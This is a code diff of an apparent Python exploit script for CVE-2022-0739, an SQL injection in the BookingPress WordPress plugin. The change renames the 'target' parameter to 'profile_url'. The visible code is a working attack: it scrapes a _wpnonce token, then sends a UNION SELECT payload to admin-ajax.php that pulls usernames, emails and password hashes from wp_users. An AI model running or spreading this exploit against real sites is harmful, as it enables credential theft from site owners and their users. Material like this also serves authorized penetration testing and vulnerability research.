@@ -25,12 +25,12 @@ def extract_data(response_body):
     except Exception as e:
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error parsing response: {e}")
 
-def exploit(target):
+def exploit(profile_url):
 
-    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Performing the SQL injection exploit on {target}...")
+    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Performing the SQL injection exploit on {profile_url}...")
 
     action = "bookingpress_front_get_category_services"
-    wp_nonce = get_nonce(target)
+    wp_nonce = get_nonce(profile_url)
     category_id = "33"
     total_service = "-7502"
     sqli = ") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -"
@@ -43,7 +43,7 @@ def exploit(target):
     }
 
     try:
-        response = requests.post(f'{target}/wp-admin/admin-ajax.php', data=payload, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
+        response = requests.post(f'{profile_url}/wp-admin/admin-ajax.php', data=payload, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
         print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit sent successfully!")
 
         return response.text
@@ -51,12 +51,12 @@ def exploit(target):
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error sending exploit request: {e}")
         return None
 
-def get_nonce(target):
+def get_nonce(profile_url):
 
-    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Retrieving '_wpnonce' token from {target}...")
+    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Retrieving '_wpnonce' token from {profile_url}...")
 
     try:
-        response = requests.get(f'{target}/events/', headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
+        response = requests.get(f'{profile_url}/events/', headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
         response_body = response.text
 
         match = re.search(r"_wpnonce:'(\w+)'", response_body)
@@ -71,9 +71,9 @@ def get_nonce(target):
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error retrieving '_wpnonce': {e}")
         return None
 
-def scan_cve_2022_0739(target):
+def scan_cve_2022_0739(profile_url):
 
-    response_body = exploit(target)
+    response_body = exploit(profile_url)
     if response_body:
         extract_data(response_body)
     else:
